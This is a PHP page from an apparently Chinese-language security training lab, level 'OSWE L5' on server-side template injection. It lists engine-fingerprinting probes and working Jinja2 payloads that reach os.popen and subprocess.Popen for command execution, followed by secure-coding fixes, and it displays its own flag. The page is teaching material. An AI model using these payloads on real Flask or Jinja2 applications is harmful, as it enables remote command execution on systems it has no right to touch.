<?php
/**
 * OSWE L5: SSTI 服务端模板注入 (300 PTS)
 */
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[260] = 'active open';
$ACTIVE[266] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
$correct_flag = 'flag{OSWE_L5_SSTI_Jinja2_OS_Command_Exec}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['oswe_flags']['flag5'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius:8px;font-weight:bold;"><i class="fa fa-check-circle"></i> 通关！【OSWE L5】SSTI 已掌握 (+300 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius:8px;font-weight:bold;"><i class="fa fa-times-circle"></i> Flag 错误。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 24px; margin-bottom: 22px; }
.step-title { font-size: 16px; font-weight: 700; color: var(--text-primary); margin-top: 0; margin-bottom: 14px; display: flex; align-items: center; gap: 8px; }
.step-num { background: linear-gradient(135deg, #06b6d4, #6366f1); color: #fff; width: 26px; height: 26px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; flex-shrink: 0; }
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color: #64748b; }
.cmd-box .template { color: #34d399; font-weight: bold; }
.cmd-box .flag-text { color: #fbbf24; font-weight: bold; }
.highlight-box { background: rgba(6,182,212,0.08); border: 1px solid rgba(6,182,212,0.25); border-radius: 8px; padding: 14px 18px; margin: 12px 0; font-size: 13px; color: var(--text-secondary); line-height: 1.7; }
.engine-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 12px 0; }
.engine-table th { background: rgba(6,182,212,0.12); color: var(--text-primary); padding: 10px 14px; text-align: left; border: 1px solid var(--border-color); }
.engine-table td { padding: 9px 14px; border: 1px solid var(--border-color); color: var(--text-secondary); font-family: monospace; }
.flag-submit-area { background: var(--bg-card); border: 2px dashed rgba(99,102,241,0.4); border-radius: 12px; padding: 24px; margin-top: 25px; text-align: center; }
</style>
<div class="main-content"><div class="main-content-inner"><div class="page-content">
    <div class="ctf-stage-header">
        <h1 class="ctf-stage-title">🏗️ OSWE L5：SSTI 服务端模板注入
            <span style="background: rgba(239,68,68,0.2); color: #fca5a5; border: 1px solid #ef4444; padding: 3px 10px; border-radius: 12px; font-size: 12px;">高级 · 300 PTS</span>
        </h1>
        <p style="color: var(--text-secondary); font-size: 14px; margin: 0; line-height: 1.6;">分析 SSTI 服务端模板注入漏洞：识别不同模板引擎（Jinja2/Twig/Smarty），从 {{7*7}} 探测，到通过 Python 类继承链访问 os 模块执行命令。</p>
        <div style="display: flex; gap: 10px; margin-top: 14px; flex-wrap: wrap;">
            <span style="background: var(--bg-secondary); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: var(--text-secondary); border: 1px solid var(--border-color);">🔧 引擎：Jinja2 · Twig · Smarty · Mako · Velocity · FreeMarker</span>
            <span style="background: var(--bg-secondary); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: var(--text-secondary); border: 1px solid var(--border-color);"><a href="oswe_hub.php" style="color: var(--text-secondary);">← 返回 OSWE 大厅</a></span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> SSTI 漏洞识别：引擎指纹探测</h3>
        <p style="font-size: 14px; color: var(--text-secondary); line-height: 1.7;">SSTI 发生在服务端将用户输入直接渲染为模板时。不同引擎有不同语法，通过特定 Payload 可识别引擎类型：</p>
        <table class="engine-table">
            <tr><th>探测 Payload</th><th>期望响应</th><th>模板引擎</th><th>语言</th></tr>
            <tr><td><span class="template">{{7*7}}</span></td><td>49</td><td>Jinja2 / Twig</td><td>Python / PHP</td></tr>
            <tr><td><span class="template">{{7*'7'}}</span></td><td>7777777</td><td>Jinja2</td><td>Python</td></tr>
            <tr><td><span class="template">{{7*'7'}}</span></td><td>49</td><td>Twig</td><td>PHP</td></tr>
            <tr><td><span class="template">${7*7}</span></td><td>49</td><td>FreeMarker / Velocity</td><td>Java</td></tr>
            <tr><td><span class="template">#{7*7}</span></td><td>49</td><td>Pebble / Thymeleaf</td><td>Java</td></tr>
            <tr><td><span class="template">&lt;%= 7*7 %&gt;</span></td><td>49</td><td>ERB</td><td>Ruby</td></tr>
            <tr><td><span class="template">*{7*7}</span></td><td>49</td><td>Thymeleaf</td><td>Java</td></tr>
        </table>
        <div class="highlight-box">
            💡 <strong>白盒审计捷径：</strong>搜索代码中的 <code>render_template_string()</code> (Flask/Jinja2)、<code>Environment().from_string()</code>、<code>Template(user_input)</code> 等直接渲染用户输入的调用点。
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> Jinja2 RCE：Python 类继承链</h3>
        <div class="cmd-box">
<span class="comment"># Jinja2 SSTI → RCE 核心路径：</span><br>
<span class="comment"># Python 中一切皆对象，通过类继承链可访问任何类</span><br><br>
<span class="comment"># 步骤 1：访问基类</span><br>
<span class="template">{{ ''.__class__ }}</span><span class="comment">  → &lt;class 'str'&gt;</span><br>
<span class="template">{{ ''.__class__.__mro__ }}</span><span class="comment">  → (&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br>
<span class="template">{{ ''.__class__.__mro__[1] }}</span><span class="comment">  → &lt;class 'object'&gt;</span><br><br>
<span class="comment"># 步骤 2：获取 object 的所有子类</span><br>
<span class="template">{{ ''.__class__.__mro__[1].__subclasses__() }}</span><br>
<span class="comment"># 输出大量类...找到 subprocess.Popen 或 os._wrap_close</span><br><br>
<span class="comment"># 步骤 3：定位 subprocess.Popen 的索引</span><br>
<span class="comment"># 假设索引为 258</span><br>
<span class="template">{{ ''.__class__.__mro__[1].__subclasses__()[258](['id'],stdout=-1).communicate() }}</span><br><br>
<span class="comment"># 简洁版：通过 config 对象（Flask 特有）</span><br>
<span class="template">{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}</span><br><br>
<span class="comment"># 通过 request 对象（Flask 特有）</span><br>
<span class="template">{{ request.application.__globals__['__builtins__']['__import__']('os').popen('id').read() }}</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> SSTI 防御：模板沙盒与输入过滤</h3>
        <div class="cmd-box">
<span class="comment"># 正确做法：将用户数据作为变量传入，而非直接渲染字符串</span><br><br>
<span class="comment"># ❌ 危险写法（直接渲染用户输入）</span><br>
from flask import Flask, request, render_template_string<br>
@app.route('/')<br>
def index():<br>
&nbsp;&nbsp;name = request.args.get('name')<br>
&nbsp;&nbsp;return render_template_string(f"Hello {name}!")  <span class="comment"># 注入！</span><br><br>
<span class="comment"># ✅ 安全写法（使用变量传参）</span><br>
@app.route('/')<br>
def index():<br>
&nbsp;&nbsp;name = request.args.get('name')<br>
&nbsp;&nbsp;return render_template_string("Hello {{ name }}!", name=name)  <span class="comment"># 安全</span><br><br>
<span class="comment"># Jinja2 沙盒模式（SandboxedEnvironment）：</span><br>
from jinja2.sandbox import SandboxedEnvironment<br>
env = SandboxedEnvironment()<br>
template = env.from_string(user_input)  <span class="comment"># 限制属性访问</span><br>
<span class="comment"># 但沙盒并非绝对安全，仍存在绕过研究</span>
        </div>
    </div>

    <div class="flag-submit-area">
        <h4 style="font-weight: 800; color: var(--text-primary); margin-top: 0;">🚩 Flag 验证 — OSWE L5</h4>
        <div class="cmd-box" style="display: inline-block; padding: 10px 24px; margin: 0 auto 16px;">
            <span class="flag-text">flag{OSWE_L5_SSTI_Jinja2_OS_Command_Exec}</span>
        </div>
        <form method="post" style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 10px;">
            <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="max-width: 420px; border-radius: 8px; font-family: monospace;">
            <button type="submit" name="check_flag" class="btn btn-primary" style="border-radius: 8px; font-weight: 700; background: #6366f1; border-color: #6366f1;"><i class="fa fa-check"></i> 验证 Flag</button>
        </form>
        <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 10px;">' . $flag_msg . '</div>'; } ?>
        <div style="margin-top: 16px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
            <a href="oswe_l4_deser.php" class="btn btn-sm btn-default" style="border-radius: 6px;">← 上一关</a>
            <a href="oswe_hub.php" class="btn btn-sm btn-default" style="border-radius: 6px;">OSWE 大厅</a>
            <a href="oswe_l6_xxe_oob.php" class="btn btn-sm" style="border-radius: 6px; background: #6366f1; color: #fff; border: none; font-weight: 700;">下一关：XXE/SSRF →</a>
        </div>
    </div>
</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
